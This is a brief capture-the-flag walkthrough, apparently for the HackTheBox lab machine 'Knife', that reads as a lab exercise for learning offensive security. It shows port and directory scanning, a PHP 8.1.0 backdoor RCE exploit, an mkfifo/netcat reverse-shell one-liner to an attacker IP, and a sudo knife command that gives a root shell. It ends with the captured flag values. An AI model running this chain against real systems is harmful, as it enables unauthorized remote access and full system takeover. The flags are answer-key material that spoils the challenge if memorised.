# Knife - Easy

```shell
nmap -T4 -p- -A -v 10.10.10.242

feroxbuster -u http://10.10.10.242 -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent

#get user-agentt rce exploit
python3 user-agentt.py
#enter webpage url

#we get shell
id

#setup listener on attacker machine
nc -nvlp 5555

#in reverse shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.3 5555 >/tmp/f

#we get another reverse shell on attacker machine
sudo -l

#exploit from GTFObins
sudo /usr/bin/knife exec -E 'exec "/bin/sh"'

id
#we are root
```

* Open ports & services:

  * 22
  * 80

* We do not have any other directories enumerated using feroxbuster.

* Using Wappalyzer, we can see that the PHP version used for webpage is 8.1.0

* Searching for exploits for this version gives us a 'User-Agentt' RCE exploit.

* With the help of this exploit, we get shell as james; this shell is not interactive enough so we can setup a listener on our machine, and get another shell.

* Now, checking sudo permissions, we can run knife binary as sudo without password.

* With the help of GTFObins exploit, we can use that to get root shell.

```markdown
1. User flag - ed9dea4830dac4298fa78bc33310d207

2. Root flag - 428d894c9ec3f5543ce834865db7b60a
```
